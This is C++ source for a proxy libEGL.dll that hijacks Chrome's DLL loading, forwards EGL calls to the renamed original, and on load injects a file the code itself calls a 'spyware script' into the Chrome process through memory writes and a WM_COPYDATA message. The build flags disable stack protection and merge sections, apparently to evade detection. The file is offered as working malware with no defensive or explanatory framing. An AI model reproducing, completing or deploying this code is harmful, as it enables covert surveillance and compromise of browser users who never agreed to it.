// proxy.cpp - Compile with: cl.exe /LD /MT /O2 /GS- proxy.cpp /link /DEF:proxy.def /OUT:libEGL.dll

#include <windows.h>
#include <string>
#include <fstream>
#include <sstream>

#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/MERGE:.pdata=.text")
#pragma comment(linker, "/MERGE:.data=.text")

static HMODULE g_originalDLL = NULL;
static std::string g_spywareScript;
static bool g_scriptLoaded = false;

// Forward all exports to the original DLL
#define EXPORT __declspec(dllexport)

// We need to forward ALL exports from libEGL.dll
// For a complete proxy, enumerate all exports from the original
// Here's the auto-forwarding mechanism

void LoadOriginalDLL() {
    if (g_originalDLL) return;
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(path, L'\\');
    if (lastSlash) *(lastSlash + 1) = 0;
    wcscat_s(path, MAX_PATH, L"libEGL_orig.dll");
    g_originalDLL = LoadLibraryW(path);
}

// Auto-forwarder macro for exports
#define FORWARD_FUNC(ret, name, ...) \
    EXPORT ret name(__VA_ARGS__) { \
        if (!g_originalDLL) LoadOriginalDLL(); \
        typedef ret (*fn)(__VA_ARGS__); \
        static fn func = NULL; \
        if (!func) func = (fn)GetProcAddress(g_originalDLL, #name); \
        if (func) return func(__VA_ARGS__); \
        return (ret)0; \
    }

// Hook: Execute our script in Chrome's context
DWORD WINAPI InjectScript(LPVOID lpParam) {
    Sleep(8000); // Wait for Chrome to fully initialize
    
    // Read the spyware script
    wchar_t scriptPath[MAX_PATH];
    GetModuleFileNameW(NULL, scriptPath, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(scriptPath, L'\\');
    if (lastSlash) {
        *(lastSlash + 1) = 0;
        wcscat_s(scriptPath, MAX_PATH, L"windows.sys.js");
        
        std::ifstream file(scriptPath, std::ios::binary);
        if (file) {
            std::ostringstream ss;
            ss << file.rdbuf();
            g_spywareScript = ss.str();
            g_scriptLoaded = true;
        }
    }
    
    if (!g_scriptLoaded) return 0;
    
    // Find the main Chrome window to get access to V8 isolate
    HWND hChrome = FindWindowW(L"Chrome_WidgetWin_1", NULL);
    if (!hChrome) return 0;
    
    DWORD chromePID;
    GetWindowThreadProcessId(hChrome, &chromePID);
    
    // Open Chrome process with full access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, chromePID);
    if (!hProcess) return 0;
    
    // Allocate memory in Chrome for our script
    size_t scriptLen = g_spywareScript.length() + 1;
    LPVOID remoteScript = VirtualAllocEx(hProcess, NULL, scriptLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteScript) {
        WriteProcessMemory(hProcess, remoteScript, g_spywareScript.c_str(), scriptLen, NULL);
        
        // Find Chrome's internal script execution function
        // This is the key - we need to call Chrome's V8::Script::Compile and Run
        // For now, we use a simpler approach: inject via Chrome's CDP if available
        
        // Alternative: Write to Chrome's console
        // Send WM_COPYDATA with our script to trigger execution
        
        COPYDATASTRUCT cds;
        cds.dwData = 0x1234;
        cds.cbData = (DWORD)scriptLen;
        cds.lpData = remoteScript;
        SendMessage(hChrome, WM_COPYDATA, (WPARAM)GetCurrentProcessId(), (LPARAM)&cds);
        
        VirtualFreeEx(hProcess, remoteScript, 0, MEM_RELEASE);
    }
    CloseHandle(hProcess);
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        LoadOriginalDLL();
        CreateThread(NULL, 0, InjectScript, NULL, 0, NULL);
    }
    return TRUE;
}

// Export forwarders for common EGL functions
extern "C" {
    FORWARD_FUNC(void*, eglGetProcAddress, const char* procname)
    FORWARD_FUNC(int, eglGetError, void)
    FORWARD_FUNC(void*, eglGetDisplay, int display_id)
    FORWARD_FUNC(int, eglInitialize, void* dpy, int* major, int* minor)
    FORWARD_FUNC(int, eglTerminate, void* dpy)
    FORWARD_FUNC(const char*, eglQueryString, void* dpy, int name)
    FORWARD_FUNC(int, eglGetConfigs, void* dpy, void* configs, int config_size, int* num_config)
    FORWARD_FUNC(int, eglChooseConfig, void* dpy, const int* attrib_list, void* configs, int config_size, int* num_config)
    FORWARD_FUNC(int, eglGetConfigAttrib, void* dpy, void* config, int attribute, int* value)
    FORWARD_FUNC(void*, eglCreateWindowSurface, void* dpy, void* config, void* win, const int* attrib_list)
    FORWARD_FUNC(void*, eglCreatePbufferSurface, void* dpy, void* config, const int* attrib_list)
    FORWARD_FUNC(void*, eglCreatePixmapSurface, void* dpy, void* config, void* pixmap, const int* attrib_list)
    FORWARD_FUNC(int, eglDestroySurface, void* dpy, void* surface)
    FORWARD_FUNC(int, eglQuerySurface, void* dpy, void* surface, int attribute, int* value)
    FORWARD_FUNC(int, eglBindAPI, int api)
    FORWARD_FUNC(int, eglQueryAPI, void)
    FORWARD_FUNC(int, eglWaitClient, void)
    FORWARD_FUNC(int, eglReleaseThread, void)
    FORWARD_FUNC(void*, eglCreatePbufferFromClientBuffer, void* dpy, int buftype, void* buffer, void* config, const int* attrib_list)
    FORWARD_FUNC(int, eglSurfaceAttrib, void* dpy, void* surface, int attribute, int value)
    FORWARD_FUNC(int, eglBindTexImage, void* dpy, void* surface, int buffer)
    FORWARD_FUNC(int, eglReleaseTexImage, void* dpy, void* surface, int buffer)
    FORWARD_FUNC(int, eglSwapInterval, void* dpy, int interval)
    FORWARD_FUNC(void*, eglCreateContext, void* dpy, void* config, void* share_context, const int* attrib_list)
    FORWARD_FUNC(int, eglDestroyContext, void* dpy, void* ctx)
    FORWARD_FUNC(int, eglMakeCurrent, void* dpy, void* draw, void* read, void* ctx)
    FORWARD_FUNC(void*, eglGetCurrentContext, void)
    FORWARD_FUNC(void*, eglGetCurrentSurface, int readdraw)
    FORWARD_FUNC(void*, eglGetCurrentDisplay, void)
    FORWARD_FUNC(int, eglQueryContext, void* dpy, void* ctx, int attribute, int* value)
    FORWARD_FUNC(int, eglWaitGL, void)
    FORWARD_FUNC(int, eglWaitNative, int engine)
    FORWARD_FUNC(int, eglSwapBuffers, void* dpy, void* surface)
    FORWARD_FUNC(int, eglCopyBuffers, void* dpy, void* surface, void* target)
}